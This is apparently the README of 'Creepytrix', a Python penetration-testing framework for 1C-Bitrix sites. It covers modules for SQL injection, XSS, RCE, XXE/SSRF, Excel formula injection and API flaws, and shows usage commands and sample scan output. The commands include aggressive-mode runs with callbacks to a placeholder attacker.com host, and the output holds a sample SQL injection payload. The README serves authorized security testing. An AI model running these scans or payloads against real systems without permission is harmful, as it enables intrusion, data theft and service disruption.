# 🔒 CREEPYTRIX - Bitrix Pentest Tool v1.1

[![Version](https://img.shields.io/badge/version-1.1.0-blue.svg)](https://github.com/toxy4ny/creepytrix)
[![Python](https://img.shields.io/badge/python-3.8+-green.svg)](https://www.python.org/downloads/)
[![License](https://img.shields.io/badge/license-MIT-yellow.svg)](LICENSE)

> **Comprehensive framework for testing the security of Bitrix CMS**
> 
> Based on research from [pentestnotes.ru](https://pentestnotes.ru/notes/bitrix_pentest_full/)

![Bitrix Pentest Tool](https://img.shields.io/badge/Bitrix-Pentest-red)

## 📋 Table of Contents

- [Description](#description)
- [Features](#features)
- [Installation](#installation)
- [Usage](#usage)
- [Modules](#modules)
- [Examples](#examples)
- [Project Structure](#project-structure)
- [Security](#security)
- [License](#license)

## 🎯 Description

**Bitrix Pentest Tool** — is a powerful framework for comprehensive security testing of sites based on **1C-Bitrix CMS**. The tool is developed based on research of Bitrix vulnerabilities and includes 11 specialized modules for identifying critical vulnerabilities.

### Main Goals:
- Identify vulnerabilities before attackers do
- Automate routine security checks
- Comprehensive analysis of all Bitrix components
- Generate detailed reports in JSON format

## ✨ Features

### 🔍 11 Security Modules

| Module | Description | Vulnerabilities |
|--------|-------------|-----------------|
| **recon** | Reconnaissance | Version detection, structure, admin panel |
| **disclosure** | Information Disclosure | Configs, backups, logs, .env files |
| **auth** | Authentication Bypass | Weak passwords, sessions, JWT |
| **sqli** | SQL Injection | Error-based, Union, Boolean, Time-based |
| **xss** | Cross-Site Scripting | Reflected, Stored, DOM-based, Blind |
| **upload** | File Upload | Arbitrary upload, bypass, traversal |
| **rce** | Remote Code Execution | Command injection, eval, deserialization |
| **xxe_ssrf** | XXE/SSRF | XML External Entity, Server-Side Request Forgery |
| **1c** | 1C Integration | 1C Exchange, enterprise data leakage |
| **excel** | Excel RCE | Formula injection, DDE, CSV injection, Power Query |
| **api** | API Scanner | REST, SOAP, GraphQL, IDOR, Mass Assignment |

### 🚀 Key Features

- **Aggressive Mode** — destructive testing with real payloads
- **OOB (Out-of-Band)** — testing with external callback server
- **Multi-threading** — fast scanning of large targets
- **JSON Reports** — structured results for automation
- **Proxy Support** — integration with Burp Suite, OWASP ZAP
- **Colored Output** — convenient terminal result reading

## 📦 Installation

### Requirements

- Python 3.8+
- pip
- git

### Quick Installation

```bash
# Clone repository
git clone https://github.com/V3kt0r39/creepytrix.git
cd creepytrix

# Install dependencies
pip install -r requirements.txt

# Check installation
python creepytrix.py --help
```

### Installation from Source

```bash
# Create virtual environment
python -m venv venv

# Activate
source venv/bin/activate  # Linux/Mac
venv\Scripts\activate     # Windows

# Install
pip install -r requirements.txt
```

## 🎮 Usage

### Basic Scanning

```bash
# Full scan of all modules
python creepytrix.py https://example.com

# Specific module
python creepytrix.py https://example.com -m api

# Aggressive mode
python creepytrix.py https://example.com -m rce -a

# Save results
python creepytrix.py https://example.com -o report.json
```

### Advanced Options

```bash
# With proxy (Burp Suite)
python creepytrix.py https://example.com --proxy http://127.0.0.1:8080

# With OOB server for blind XXE
python creepytrix.py https://example.com -m xxe_ssrf -a --oob-server http://your-server.com

# With callback for Excel RCE
python creepytrix.py https://example.com -m excel -a --callback-server http://your-server.com

# Quiet mode (only errors and critical findings)
python creepytrix.py https://example.com -q

# Verbose output
python creepytrix.py https://example.com -v
```

## 🧩 Modules

### 1. Reconnaissance (`recon`)
```bash
python creepytrix.py https://example.com -m recon
```
- Bitrix version detection
- Edition discovery (Start, Standard, Business, Enterprise)
- Admin panel search (`/bitrix/admin/`)
- Website structure analysis

### 2. Information Disclosure (`disclosure`)
```bash
python creepytrix.py https://example.com -m disclosure
```
- Search for `.settings.php`, `after_connect.php`
- Backup discovery (`*.tar.gz`, `*.zip`, `*.sql`)
- Error logs (`error.log`, `exception.log`)
- `.env` files and configurations

### 3. Authentication Bypass (`auth`)
```bash
python creepytrix.py https://example.com -m auth -a
```
- Default password check (admin/admin, bitrix/bitrix)
- Session-based authorization bypass
- JWT vulnerabilities (weak secrets, alg: none)
- OAuth misconfigurations

### 4. SQL Injection (`sqli`)
```bash
python creepytrix.py https://example.com -m sqli -a
```
- Error-based SQLi
- Union-based SQLi
- Boolean-based blind SQLi
- Time-based blind SQLi

### 5. XSS Scanner (`xss`)
```bash
python creepytrix.py https://example.com -m xss -a
```
- Reflected XSS
- Stored XSS
- DOM-based XSS
- Blind XSS with callback

### 6. File Upload (`upload`)
```bash
python creepytrix.py https://example.com -m upload -a
```
- Arbitrary file upload
- MIME-type bypass
- Path traversal
- Race condition

### 7. RCE Tester (`rce`)
```bash
python creepytrix.py https://example.com -m rce -a
```
- Command injection
- Code evaluation (PHP, Python)
- Deserialization attacks
- Template injection (Twig, Smarty)
- Known CVE for Bitrix

### 8. XXE/SSRF (`xxe_ssrf`)
```bash
python creepytrix.py https://example.com -m xxe_ssrf -a --oob-server http://attacker.com
```
- XML External Entity (XXE)
- Blind XXE with OOB
- Server-Side Request Forgery (SSRF)
- Cloud metadata access (AWS, GCP, Azure)
- Internal port scanning

### 9. 1C Integration (`1c`)
```bash
python creepytrix.py https://example.com -m 1c -a
```
- 1C Exchange vulnerabilities (`/bitrix/admin/1c_exchange.php`)
- Authentication bypass in 1C
- XXE via XML import
- Enterprise data leakage (products, prices, customers)
- SOAP/REST API 1C exposure

### 10. Excel RCE (`excel`)
```bash
python creepytrix.py https://example.com -m excel -a --callback-server http://attacker.com
```
- Formula injection (DDE)
- CSV injection
- Power Query exploits
- Macro injection (XLSM)
- XXE via Office Open XML structure

### 11. API Scanner (`api`)
```bash
python creepytrix.py https://example.com -m api -a
```
- REST API (`/rest/`, `/api/`)
- SOAP API (`/bitrix/soap/`)
- GraphQL (`/graphql/`)
- JWT vulnerabilities
- IDOR (Insecure Direct Object Reference)
- Mass Assignment
- Rate limiting bypass

## 📊 Examples

### Example 1: Quick Check for Critical Vulnerabilities

```bash
$ python creepytrix.py https://target.com -q
      
    Bitrix Security Testing Tool v1.1
    Modules: Recon | Info Disclosure | Auth Bypass | SQLi | XSS | Upload | RCE | XXE/SSRF | 1C | Excel RCE | API
    Based on: https://pentestnotes.ru/notes/bitrix_pentest_full/

[13:42:20] [INFO] Target: https://target.com
[13:42:20] [INFO] Module: all
[13:42:20] [INFO] Mode: Standard
[13:42:20] [WARNING] ============================================================
[13:42:20] [WARNING] WARNING: Destructive modules enabled!
[13:42:20] [WARNING] Only test systems you have permission to test!
[13:42:20] [WARNING] ============================================================

[13:42:25] [CRITICAL] !!! UNPROTECTED API: REST API Root accessible without auth!
[13:42:30] [CRITICAL] !!! SQLi: Error-based SQL injection in /catalog/
[13:42:35] [CRITICAL] !!! IDOR: Access to user 123 without authorization
[13:42:40] [CRITICAL] !!! 1C EXCHANGE: Enterprise data leakage (products, prices)

[13:42:45] [INFO] ============================================================
[13:42:45] [INFO] SCAN COMPLETED
[13:42:45] [INFO] ============================================================
[13:42:45] [CRITICAL] Found 4 CRITICAL issues!
[13:42:45] [CRITICAL] Immediate action required!
```

### Example 2: API-only Scanning in Aggressive Mode

```bash
$ python creepytrix.py https://target.com -m api -a -v

[14:15:30] [INFO] Starting API scan for https://target.com
[14:15:31] [INFO] Discovering API endpoints...
[14:15:32] [INFO] Found API: REST API Root (200)
[14:15:33] [INFO] Found API: Mobile API (401)
[14:15:34] [WARNING] Endpoint accessible without auth: /rest/
[14:15:35] [CRITICAL] !!! UNPROTECTED API: REST API Root

[14:15:40] [INFO] Testing API authentication...
[14:15:45] [WARNING] JWT uses weak signing secret: 'secret'
[14:15:50] [CRITICAL] !!! WEAK JWT SECRET: secret

[14:15:55] [INFO] Testing for IDOR vulnerabilities...
[14:16:00] [CRITICAL] !!! IDOR: Access to user 2 at https://target.com/rest/user.get?id=2
[14:16:05] [CRITICAL] !!! IDOR: Access to order 999 at https://target.com/rest/sale.order.get?id=999

[14:16:10] [INFO] Testing for SQL/NoSQL injections...
[14:16:15] [CRITICAL] !!! SQLi in API: https://target.com/rest/user.get?filter[NAME]=' OR '1'='1

[14:16:20] [INFO] Testing for mass assignment...
[14:16:25] [WARNING] Potential mass assignment: is_admin field accepted

[14:16:30] [INFO] Testing rate limiting...
[14:16:35] [WARNING] No rate limiting at REST API Root (10/10 requests succeeded)

[14:16:40] [INFO] API scan complete: 7 findings (5 critical)
[14:16:40] [INFO] Discovered API Endpoints: 3
[14:16:40] [INFO] API Versions: 1.0, 2.0
```

### Example 3: Generate JSON Report

```bash
$ python creepytrix.py https://target.com -o report.json

$ cat report.json | jq '.modules.api_scanner.summary'
{
  "total_findings": 7,
  "critical": 5,
  "high": 1,
  "medium": 1,
  "low": 0,
  "auth_issues": 2,
  "idor_vulns": 2,
  "injection_vulns": 1,
  "mass_assignment_vulns": 1,
  "info_disclosure": 0,
  "misconfigurations": 1,
  "discovered_endpoints": 3,
  "api_versions": 2
}
```

## 📁 Project Structure

```
creepytrix/
├── modules/                    # Scanning modules
│   ├── __init__.py
│   ├── recon.py               # Reconnaissance
│   ├── info_disclosure.py     # Information Disclosure
│   ├── auth_bypass.py         # Authentication Bypass
│   ├── sqli_scanner.py        # SQL Injection
│   ├── xss_scanner.py         # XSS
│   ├── file_upload.py         # File Upload
│   ├── rce_tester.py          # RCE
│   ├── xxe_ssrf.py            # XXE/SSRF
│   ├── integration_1c.py      # 1C Integration
│   ├── excel_rce.py           # Excel RCE
│   └── api_scanner.py         # API Scanner
├── utils/                      # Utilities
│   ├── __init__.py
│   ├── requester.py           # HTTP Requests
│   ├── logger.py              # Logging
│   └── parser.py              # Response Parsing
├── creepytrix.py              # Main Script
├── requirements.txt           # Dependencies
├── README.md                  # Documentation
└── LICENSE                    # License
```

## ⚠️ Security

### ⚡ Warning

**Use this tool only on systems you own or have explicit written permission to test!**

- Unauthorized scanning of other systems is **illegal**
- Aggressive mode (`-a`) can **modify data** or **disrupt** system operation
- Some modules (RCE, Excel RCE, 1C) can execute **arbitrary code**
- Always have backups before testing

### Recommendations

1. **Test on staging/dev** environment before production
2. **Use proxy** (`--proxy`) to monitor requests
3. **Start with safe modules** (recon, disclosure) before aggressive ones
4. **Check scope** — don't go beyond permitted targets

## 🤝 Contributing

We welcome contributions to the project!

### How to Contribute:

1. Fork the repository
2. Create a feature branch (`git checkout -b feature/amazing-feature`)
3. Commit your changes (`git commit -m 'Add amazing feature'`)
4. Push to the branch (`git push origin feature/amazing-feature`)
5. Open a Pull Request

### Report a Bug

Use [GitHub Issues](https://github.com/toxy4ny/creepytrix/issues) with the `bug` label

### Request a Feature

Use [GitHub Issues](https://github.com/toxy4ny/creepytrix/issues) with the `enhancement` label

## 📚 Useful Resources

- [pentestnotes.ru Research](https://pentestnotes.ru/notes/bitrix_pentest_full/)
- [Bitrix API Documentation](https://dev.1c-bitrix.ru/rest_help/)
- [OWASP Testing Guide](https://owasp.org/www-project-web-security-testing-guide/)
- [CWE Top 25](https://cwe.mitre.org/top25/)

## 📄 License

Distributed under the MIT License.

---

**Disclaimer**: This tool is intended only for legal security testing. The authors are not responsible for misuse.

Made with ❤️ for the information security community
